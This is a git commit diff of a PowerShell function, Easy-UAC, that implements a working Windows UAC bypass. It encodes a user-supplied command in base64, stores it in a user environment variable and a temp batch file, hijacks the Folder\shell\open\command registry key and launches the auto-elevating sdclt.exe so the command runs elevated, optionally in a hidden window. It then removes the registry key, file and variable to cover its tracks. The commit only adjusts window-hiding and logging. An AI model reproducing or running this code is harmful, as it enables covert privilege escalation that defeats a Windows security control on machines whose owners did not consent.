f3bf129ec10e4b473994906798ac8dddc7b41cd9
moritzpfefferkorn@hotmail.com <moritzpfefferkorn@hotmail.com>
2021-04-27 11:04:00 +0200

    Update Easy-UAC.ps1

--- Easy-UAC.ps1
+++ Easy-UAC.ps1
@@ -18,19 +18,19 @@ function Easy-UAC {
 		[Int64]
 		$SleepDuration = 2
 	)
-	if ($Hidden) {powershell -WindowStyle Hidden -c ""; $hide = "powershell -WindowStyle Hidden  -c ''"} else {$hide = ""}
+	if ($Hidden) {powershell -WindowStyle Hidden -c ""; $hide = "-WindowStyle Hidden"} else {$hide = ""}
 	if ($NoExitChild) {$end = "pause"} else {$end = "Exit;Exit;Exit"}
 	$encCommand = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Command))
 	$Path = $env:TEMP + '\A.bat'
-	$Value = "$hide;Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command';Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', `$null,[System.EnvironmentVariableTarget]::User);powershell ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')));$end"
-	[System.Environment]::SetEnvironmentVariable('A', $Value, [System.EnvironmentVariableTarget]::User) | Write-Verbose
-	New-Item -Path $Path -Value '%A%' | Write-Verbose
-	New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $Path | Write-Verbose
-	New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Write-Verbose
-	(sdclt.exe) | Out-Null
-	Start-Sleep $SleepDuration | Write-Verbose
-	Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command' -Force | Write-Verbose
-	[System.Environment]::SetEnvironmentVariable('A', $null,[System.EnvironmentVariableTarget]::User) | Write-Verbose
-	Remove-Item $Path | Write-Verbose
+	$Value = "powershell $hide -c Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command';Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', `$null,[System.EnvironmentVariableTarget]::User);powershell ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')));$end"
+	[System.Environment]::SetEnvironmentVariable('A', $Value, [System.EnvironmentVariableTarget]::User)
+	New-Item -Path $Path -Value '%A%'
+	New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $Path
+	New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+	sdclt.exe
+	Start-Sleep $SleepDuration
+	Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command'
+	[System.Environment]::SetEnvironmentVariable('A', $null,[System.EnvironmentVariableTarget]::User)
+	Remove-Item $Path
 	if (!$NoExitHost) {Exit;Exit;Exit}
 }
